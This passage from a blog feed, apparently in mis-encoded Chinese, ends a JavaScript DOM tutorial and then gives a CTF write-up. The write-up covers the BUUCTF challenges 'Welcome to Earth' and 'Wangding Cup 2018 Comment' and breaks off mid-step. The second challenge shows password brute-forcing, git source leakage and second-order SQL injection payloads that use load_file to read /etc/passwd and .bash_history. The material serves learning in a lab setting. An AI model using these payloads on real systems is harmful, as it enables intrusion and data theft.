alt="image-20220411122948862"></p><p><strong>å®šæ—¶å™¨è¿”å›å€¼</strong></p><pre><code>ä¸åŒºåˆ†å®šæ—¶å™¨ç§ç±»è¡¨ç¤ºæ˜¯å½“å‰é¡µé¢çš„ç¬¬å‡ ä¸ªå®šæ—¶å™¨</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411123144526.png" alt="image-20220411123144526"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411123157829.png" alt="image-20220411123157829"></p><p>æ˜¯ä¸åŒºåˆ†ç§ç±»çš„ï¼Œåªè¡¨ç¤ºæ˜¯é¡µé¢ç¬¬å‡ ä¸ªå®šæ—¶å™¨</p><p><strong>å…³é—­å®šæ—¶å™¨</strong></p><pre><code>è¯­æ³•ä¸€: clearInterval(è¦å…³é—­çš„å®šæ—¶å™¨è¿”å›å€¼)è¯­æ³•äºŒ: clearTimeout(è¦å…³é—­çš„å®šæ—¶å™¨è¿”å›å€¼)è¿™æ˜¯ä¸åŒºåˆ†å®šæ—¶å™¨ç§ç±»çš„å¯ä»¥äº’ç›¸å…³é—­</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135402168.png" alt="image-20220411135402168"></p><h1 id="DOMåŸºæœ¬æ“ä½œ"><a href="#DOMåŸºæœ¬æ“ä½œ" class="headerlink" title="DOMåŸºæœ¬æ“ä½œ"></a>DOMåŸºæœ¬æ“ä½œ</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135516647.png" alt="image-20220411135516647"></p><p><strong>è·å–å…ƒç´ æ–¹å¼</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135606813.png" alt="image-20220411135606813"></p><ol><li><p>æ ¹æ®idåç§°è·å–</p><pre><code>è¯­æ³•: document.getElementById(&#39;idåç§°&#39;)ä½œç”¨: è·å–æ–‡æ¡£æµä¸­idåå¯¹åº”çš„ä¸€ä¸ªå…ƒç´ è¿”å›å€¼:    å¦‚æœæœ‰idå¯¹åº”çš„å…ƒç´ ï¼Œå°±æ˜¯è¿™ä¸ªå…ƒç´     å¦‚æœæ²¡æœ‰idå¯¹åº”çš„å…ƒç´ ï¼Œå°±æ˜¯null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411140343642.png" alt="image-20220411140343642"></p></li><li><p>æ ¹æ®å…ƒç´ ç±»åè·å–</p><pre><code>è¯­æ³•: document.getElementsByClassName(&#39;å…ƒç´ ç±»å&#39;)ä½œç”¨: è·å–æ–‡æ¡£æµä¸­æ‰€æœ‰ç±»åå¯¹åº”çš„å…ƒç´ è¿”å›å€¼: å¿…å®šæ˜¯ä¸€ä¸ªä¼ªæ•°ç»„    å¦‚æœæœ‰ç±»åå¯¹åº”çš„å…ƒç´ ï¼Œæœ‰å¤šå°‘è·å–å¤šå°‘    å¦‚æœæ²¡ç”¨ç±»åå¯¹åº”çš„å…ƒç´ ï¼Œç©ºçš„ä¼ªæ•°ç»„</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411141050751.png" alt="image-20220411141050751"></p></li><li><p>æ ¹æ®å…ƒç´ æ ‡ç­¾åè·å–</p><pre><code>è¯­æ³•: document.getElementsByTagName(&#39;æ ‡ç­¾å&#39;)ä½œç”¨ï¼› è·å–æ–‡æ¡£æµä¸­æ‰€æœ‰æ ‡ç­¾åå¯¹åº”çš„å…ƒç´ è¿”å›å€¼ï¼›å¿…ç„¶æ˜¯ä¸€ä¸ªä¼ªæ•°ç»„    å¦‚æœæœ‰æ ‡ç­¾åå¯¹åº”çš„å…ƒç´ ï¼Œæœ‰å¤šå°‘è·å–å¤šå°‘    å¦‚æœæ²¡ç”¨æ ‡ç­¾åå¯¹åº”çš„å…ƒç´ ï¼Œç©ºçš„ä¼ªæ•°ç»„</code></pre><p> <img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411141947898.png" alt="image-20220411141947898"></p></li><li><p>æ ¹æ®é€‰æ‹©å™¨è·å–ä¸€ä¸ª</p><pre><code>è¯­æ³•ï¼› document.querySelector(&#39;é€‰æ‹©å™¨&#39;)ä½œç”¨: è·å–æ–‡æ¡£æµä¸­æ»¡è¶³é€‰æ‹©å™¨è§„åˆ™çš„ç¬¬ä¸€ä¸ªå…ƒç´ è¿”å›å€¼:    å¦‚æœæœ‰é€‰æ‹©å™¨å¯¹åº”çš„å…ƒç´ ï¼Œè·å–åˆ°ç¬¬ä¸€ä¸ª    å¦‚æœæ²¡ç”¨é€‰æ‹©å™¨å¯¹åº”çš„å…ƒç´ ï¼Œè¿”å›null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411142650050.png" alt="image-20220411142650050"></p></li><li><p>æ ¹æ®é€‰æ‹©å™¨è·å–ä¸€ç»„</p><pre><code>è¯­æ³•:document.querySelectorAll(&#39;é€‰æ‹©å™¨&#39;)ä½œç”¨: è·å–æ–‡æ¡£æµä¸­æ‰€æœ‰æ»¡è¶³é€‰æ‹©å™¨è§„åˆ™çš„å…ƒç´ è¿”å›å€¼: å¿…ç„¶æ˜¯ä¸€ä¸ªä¼ªæ•°ç»„    å¦‚æœæœ‰é€‰æ‹©å™¨å¯¹åº”çš„å…ƒç´ ï¼Œè·å–åˆ°ç¬¬ä¸€ä¸ª    å¦‚æœæ²¡ç”¨é€‰æ‹©å™¨å¯¹åº”çš„å…ƒç´ ï¼Œè¿”å›null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411143324177.png" alt="image-20220411143324177"></p></li></ol><p><strong>æ“ä½œå…ƒç´ å†…å®¹</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144452327.png" alt="image-20220411144452327"></p><ol><li><p>æ“ä½œå…ƒç´ æ–‡æœ¬å†…å®¹</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144426234.png" alt="image-20220411144426234"></p></li><li><p>æ“ä½œå…ƒç´ è¶…æ–‡æœ¬å†…å®¹</p></li></ol><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144816538.png" alt="image-20220411144816538"></p><p><strong>æ“ä½œå…ƒç´ å±æ€§</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411145038287.png" alt="image-20220411145038287"></p><ol><li><p>åŸç”Ÿå±æ€§</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411145906291.png" alt="image-20220411145906291"></p></li><li><p>è‡ªå®šä¹‰å±æ€§</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411150625140.png" alt="image-20220411150625140"></p></li></ol><p><strong>æ“ä½œå…ƒç´ ç±»å</strong></p><pre><code>è·å–: å…ƒç´ .classNameè®¾ç½®ï¼› å…ƒç´ .className = &#39;æ–°ç±»å&#39;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411151419501.png" alt="image-20220411151419501"></p><p><strong>æ“ä½œå…ƒç´ è¡Œå†…æ ·å¼</strong></p><pre><code>è·å–: å…ƒç´ .style.æ ·å¼åè®¾ç½®: å…ƒç´ .style.æ ·å¼å = &#39;æ ·å¼å€¼&#39;æ³¨æ„: åªèƒ½è·å–å’Œè®¾ç½®å…ƒç´ çš„è¡Œå†…æ ·å¼</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152231051.png" alt="image-20220411152231051"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152308257.png" alt="image-20220411152308257"></p><p><strong>è·å–å…ƒç´ éè¡Œå†…æ ·å¼</strong></p><pre><code>è·å–:window.getComputedStyle(å…ƒç´ ).æ ·å¼åæ³¨æ„ï¼› å¯ä»¥è·å–è¡Œå†…æ ·å¼ï¼Œä¹Ÿå¯ä»¥è·å–éè¡Œå†…æ ·å¼</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152807202.png" alt="image-20220411152807202"></p>]]></content>
      
      
      <categories>
          
          <category> è¯­è¨€ </category>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®</title>
      <link href="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/"/>
      <url>/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="é¢˜ç›®åˆ—è¡¨"><a href="#é¢˜ç›®åˆ—è¡¨" class="headerlink" title="é¢˜ç›®åˆ—è¡¨"></a>é¢˜ç›®åˆ—è¡¨</h1><p><strong>Webæ–¹å‘ï¼š</strong></p><p>[b01lers2020]Welcome to Earth</p><p>[ç½‘é¼æ¯ 2018]Comment</p><p>[GYCTF2020]Ezsqli</p><p>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</p><p>[watevrCTF-2019]Cookie Store</p><p>[SWPUCTF 2018]SimplePHP</p><p>[WUSTCTF2020]CV Maker</p><p>[HarekazeCTF2019]encode_and_encode</p><p>[çº¢æ˜è°·CTF 2021]write_shell</p><p>[SUCTF 2019]EasyWeb</p><p>[RootersCTF2019]I_&lt;3_Flask</p><p>[NCTF2019]SQLi</p><p>[NPUCTF2020]ezinclude</p><p>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</p><h1 id="åˆ·é¢˜"><a href="#åˆ·é¢˜" class="headerlink" title="åˆ·é¢˜"></a>åˆ·é¢˜</h1><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>è¿›å»åï¼Œå®ƒä¼šç›´æ¥æç¤ºæˆ‘ï¼Œæˆ‘dieäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°å®ƒæœ‰ä¸ªä¸€é—ªè€Œè¿‡çš„ç”»é¢ã€‚</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203228318.png" alt="image-20220328203228318"></p><p>åœ¨è¿™ä¸ªé¡µé¢æ²¡æœ‰å‘ç°ï¼Œä½¿ç”¨burpæŠ“åŒ…</p><p>æŠ“åˆ°</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203639569.png" alt="image-20220328203639569"></p><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°äº†ä¸ªæœ‰è¶£çš„è·¯å¾„</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204251360.png" alt="image-20220328204251360"></p><p>ç»§ç»­ç”¨burpæŠ“åŒ…æ‰“å¼€</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204549649.png" alt="image-20220328204549649"></p><p>è¿™ä¸¤ä¸ªéƒ½ç‚¹å‡»åï¼Œæ²¡æœ‰æ•ˆæœ</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204655545.png" alt="image-20220328204655545"></p><p>æŸ¥çœ‹ä¸‹æºä»£ç ï¼Œå‘ç°ä¸€ä¸ªå¯ç–‘è·¯å¾„</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204718322.png" alt="image-20220328204718322"></p><p>è¿›å…¥åï¼Œç•Œé¢å¦‚ä¸‹</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204815035.png" alt="image-20220328204815035"></p><p>ç‚¹å‡»æŒ‰é’®ï¼Œåˆä¼šdie</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204844208.png" alt="image-20220328204844208"></p><p>ç»§ç»­æŸ¥çœ‹æºä»£ç ï¼Œæ— é™å¥—å¨ƒå‘—</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204931097.png" alt="image-20220328204931097"></p><p>è¿›å»</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205009037.png" alt="image-20220328205009037"></p><p>ç‚¹å‡»continue<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205120224.png" alt="image-20220328205120224"></p><p>è¦é€‰æ‹©ä¸€ä¸ªæ­£ç¡®çš„æ•°å­—ï¼Œä½†æ˜¯å¤ªå¤šäº†å§ï¼Œå…ˆçœ‹çœ‹æºä»£ç å§ï¼Œå‘ç°å¦‚ä¸‹jsä»£ç </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205425890.png" alt="image-20220328205425890"></p><p>å˜¿å˜¿ï¼Œä¸ç”¨ä¸€ä¸ªä¸ªè¯•äº†ï¼Œç›´æ¥åˆ°openç›®å½•</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205558332.png" alt="image-20220328205558332"></p><p>ç»§ç»­æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°fightç›®å½•</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205711090.png" alt="image-20220328205711090"></p><p>è¿›å…¥ï¼Œä¸€ä¸ªå¯æ€•çš„å¤–æ˜Ÿäºº</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205745540.png" alt="image-20220328205745540"></p><p>ç»§ç»­æŸ¥çœ‹æºä»£ç </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205854907.png" alt="image-20220328205854907"></p><p>å‘ç°flagçš„é¡ºåºè¢«æ‰“ç®—ï¼Œæƒ³è¦åè§£å‡½æ•°ä¸ç°å®ï¼Œå°è¯•å…¨æ’åˆ—</p><pre><code>itertools.permutations()ï¼šå°±æ˜¯è¿”å›å¯è¿­ä»£å¯¹è±¡çš„æ‰€æœ‰æ•°å­¦å…¨æ’åˆ—æ–¹å¼,å®ƒä»¥ä»»æ„è¿­ä»£ä½œä¸ºå‚æ•°ï¼Œå¹¶å§‹ç»ˆè¿”å›ç”Ÿæˆå…ƒç»„çš„è¿­ä»£å™¨ã€‚å®ƒæ²¡æœ‰(ä¹Ÿä¸åº”è¯¥)ç‰¹æ®Šçš„å­—ç¬¦ä¸²ã€‚è¦è·å¾—å­—ç¬¦ä¸²åˆ—è¡¨ï¼Œæ‚¨å¯ä»¥è‡ªå·±åŠ å…¥å…ƒç»„ï¼š list(map(&quot;&quot;.join, itertools.permutations(&#39;1234&#39;)))</code></pre><pre><code class="python">from itertools import permutationsflag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]item = permutations(flag)for i in item:    #print (i)    k=&quot;&quot;.join(i)    #print(k)    if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1]==&#39;&#125;&#39;:        print(k)</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328215044738.png" alt="image-20220328215044738"></p><p>æ‰¾åˆ°å¯èƒ½çš„flagï¼Œå°è¯•å³å¯</p><p>æœ€ç»ˆflagä¸º</p><pre><code>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</code></pre><h2 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h2><p>éœ€è¦ç™»å½•æ‰èƒ½å‘å¸–</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231641292.png" alt="image-20220328231641292"></p><p>.ç»™äº†è´¦å·å’Œå¯†ç å‰å‡ ä½ï¼Œç›´æ¥burpçˆ†ç ´</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231742892.png" alt="image-20220328231742892"></p><p>æˆåŠŸçˆ†ç ´å‡ºå¯†ç </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231810749.png" alt="image-20220328231810749"></p><p>æ²¡å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ï¼Œç”¨dirsearchæ‰«ä¸€ä¸‹ç›®å½•ï¼Œæ³¨æ„ï¼Œç”±äºbuuå¾ˆå®¹æ˜“å´©æºƒï¼Œè¦é™ä½é€Ÿåº¦</p><pre><code>python dirsearch.py -u http://bc06d5bc-c6b1-49d6-b004-e2f130e630ae.node4.buuoj.cn:81/ -e php -t 2 -s 0.2 -o C:\User\Sakura\Desktop\2.txt</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232440677.png" alt="image-20220328232440677"></p><p>å‘ç°gitæ³„éœ²,ä½¿ç”¨githackæ‰’å‡ºæºç </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232710003.png" alt="image-20220328232710003"></p><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    break;case &#39;comment&#39;:    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p>ä½†æ˜¯è¿™æ®µä»£ç æ˜æ˜¾ä¸å®Œæ•´</p><p>ä½¿ç”¨(è¿™é‡Œæ¨èä½¿ç”¨linuxï¼Œæˆ‘ç”¨windowså‡ºç°äº†é”™è¯¯)</p><pre><code>git log --all</code></pre><p>æŸ¥ä¸€ä¸‹ä¹‹å‰æäº¤çš„ç‰ˆæœ¬</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000637723.png" alt="image-20220329000637723"></p><p>æ¢å¤åˆ°åˆå§‹ç‰ˆæœ¬</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000916068.png" alt="image-20220329000916068"></p><p>æˆåŠŸå¾—åˆ°å®Œæ•´æºç </p><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category = addslashes($_POST[&#39;category&#39;]);    $title = addslashes($_POST[&#39;title&#39;]);    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into board            set category = &#39;$category&#39;,                title = &#39;$title&#39;,                content = &#39;$content&#39;&quot;;    $result = mysql_query($sql);    header(&quot;Location: ./index.php&quot;);    break;case &#39;comment&#39;:    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    if($num&gt;0)&#123;    $category = mysql_fetch_array($result)[&#39;category&#39;];    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into comment            set category = &#39;$category&#39;,                content = &#39;$content&#39;,                bo_id = &#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    &#125;    header(&quot;Location: ./comment.php?id=$bo_id&quot;);    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p>å¼€å§‹å®¡è®¡ä»£ç </p><p>å…ˆä»‹ç»ä¸‹addslasheså‡½æ•°</p><pre><code>addslashes() å‡½æ•°åœ¨æŒ‡å®šçš„é¢„å®šä¹‰å­—ç¬¦å‰æ·»åŠ åæ–œæ ã€‚è¿™äº›å­—ç¬¦æ˜¯å•å¼•å·ï¼ˆ&#39;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸NULï¼ˆNULLå­—ç¬¦ï¼‰ã€‚</code></pre><p>é€»è¾‘å…¶å®å¾ˆæ¸…æ™°</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329003323533.png" alt="image-20220329003323533"></p><p>å½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªé¡µé¢ï¼Œå–å‡ºè¿™ä¸ªé¡µé¢ä¸­categoryçš„å€¼ç„¶åæ¥å—contentçš„å€¼ï¼Œæ’å…¥åˆ°è¯¥é¡µé¢ã€‚ä½†æ˜¯é—®é¢˜å°±å‡ºåœ¨ï¼Œæ­¤ä»£ç åªå¯¹ç”¨æˆ·è¾“å…¥çš„å€¼åšäº†è½¬ä¹‰ï¼Œè€Œç»å¯¹ä¿¡ä»»ä»æœåŠ¡å™¨ä¸­å–å‡ºçš„å€¼ï¼Œè¿™å°±å¯¼è‡´äº†äºŒæ¬¡æ³¨å…¥ã€‚æ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•é—­åˆsqlè¯­å¥ï¼Œä½¿å…¶å¯ä»¥æ‰§è¡Œæˆ‘ä»¬æ¶æ„çš„sqlè¯­å¥ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è¦å¯¹å‘å¸–å¤„çš„categoriesåšç‰¹æ®Šè¾“å…¥</p><pre><code>0&#39;,content = database(), /*</code></pre><p>ç„¶ååœ¨ç•™è¨€å¤„è¾“å…¥</p><pre><code>*/#</code></pre><p>è¿™æ—¶å€™çš„sqlè¯­å¥å°±å˜ä¸º</p><pre><code>$sql = &quot;insert into comment        set category = &#39;0&#39;,content = &#39;database()&#39;/*&#39;,        content = &#39;*/#&#39;,        bo_id = &#39;$bo_id&#39;&quot;;</code></pre><p>ç®€åŒ–å</p><pre><code>$sql = &quot;insert into comment set category = &#39;0&#39;,content = &#39;database()&#39;,bo_id = &#39;$bo_id&#39;&quot;;</code></pre><p>è¿™æ ·é€šè¿‡åœ¨categoryæ„é€ ï¼Œå¯ä»¥æŠŠcontentæ›¿æ¢æˆæˆ‘ä»¬æƒ³è¦çš„è¯­å¥</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æ‰§è¡Œæ•ˆæœ</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005247027.png" alt="image-20220329005247027"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005310132.png" alt="image-20220329005310132"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005321316.png" alt="image-20220329005321316"></p><p>æˆåŠŸçˆ†å‡ºäº†æ•°æ®åº“</p><p>æŸ¥çœ‹ä¸€ä¸‹æƒé™</p><pre><code>0&#39;,content = user(), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005602357.png" alt="image-20220329005602357"></p><p>æœ€é«˜æƒé™ï¼Œå¯ä»¥å°è¯•load_file()è¯»å–æ–‡ä»¶</p><pre><code>0&#39;,content = load_file(&#39;/etc/passwd&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005942676.png" alt="image-20220329005942676"></p><p>æˆ‘ä»¬å‘ç°wwwç”¨æˆ·(ä¸€èˆ¬å’Œç½‘ç«™æ“ä½œç›¸å…³çš„ç”¨æˆ·ï¼Œç”±ä¸­é—´ä»¶åˆ›å»º)åœ¨/home/wwwç›®å½•,è¯»å–è¿™ä¸‹é¢çš„.bash_historyæ–‡ä»¶</p><pre><code>æ¯ä¸ªåœ¨ç³»ç»Ÿä¸­æ‹¥æœ‰è´¦å·çš„ç”¨æˆ·åœ¨ä»–çš„ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ªâ€œ.bash_historyâ€æ–‡ä»¶ï¼Œä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤ï¼Œæ–¹ä¾¿æŸ¥æ‰¾ã€‚</code></pre><pre><code>0&#39;,content = load_file(&#39;/home/www/.bash_history&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010244317.png" alt="image-20220329010244317"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒè§£å‹äº†ä¸€ä¸ªhtml.zipï¼Œåˆ é™¤html.zip,ç„¶åæ•´ä¸ªæ–‡ä»¶å¤¹å¤åˆ¶åˆ°/var/www/htmlé‡Œï¼Œç„¶ååˆ é™¤.DS_Store</p><pre><code>.DS_Store(è‹±æ–‡å…¨ç§° Desktop Services Store)æ˜¯ä¸€ç§ç”±è‹¹æœå…¬å¸çš„Mac OS Xæ“ä½œç³»ç»Ÿæ‰€åˆ›é€ çš„éšè—æ–‡ä»¶ï¼Œç›®çš„åœ¨äºå­˜è´®ç›®å½•çš„è‡ªå®šä¹‰å±æ€§ï¼Œä¾‹å¦‚æ–‡ä»¶ä»¬çš„å›¾æ ‡ä½ç½®æˆ–è€…æ˜¯èƒŒæ™¯è‰²çš„é€‰æ‹©ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</code></pre><p>å®ƒè¿˜æœ‰ä¸€ä»½å­˜åœ¨äºåœ¨/tmp//html/ç›®å½•ä¸­ï¼Œæ„é€ sqlè¯­å¥è¿›è¡Œè¯»å–</p><pre><code>0&#39;,content = load_file(&#39;/tmp/html/.DS_Store&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010811271.png" alt="image-20220329010811271"></p><p>è¿™é‡Œæ–‡ä»¶å¤ªå¤šï¼Œæ— æ³•å®Œå…¨æ˜¾ç¤ºï¼Œè¿›è¡Œåå…­è¿›åˆ¶è½¬æ¢</p><pre><code>0&#39;,content = hex(load_file(&#39;/tmp/html/.DS_Store&#39;)), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329011204300.png" alt="image-20220329011204300"></p><p>è§£ç </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013046184.png" alt="image-20220329013046184"></p><p>å‘ç°å¯ç–‘æ–‡ä»¶</p><pre><code>flag_8946e1ff1ee3e40f.php</code></pre><p>æ„é€ 